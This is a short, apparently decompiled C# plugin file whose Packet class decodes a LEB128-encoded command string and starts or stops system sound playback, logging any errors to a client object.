using System;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			string text = (string)LEB128.Read(data)[0];
			if (!(text == "Start"))
			{
				if (text == "Stop")
				{
					SysSound.Stop();
				}
			}
			else
			{
				SysSound.Recovery();
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}
}
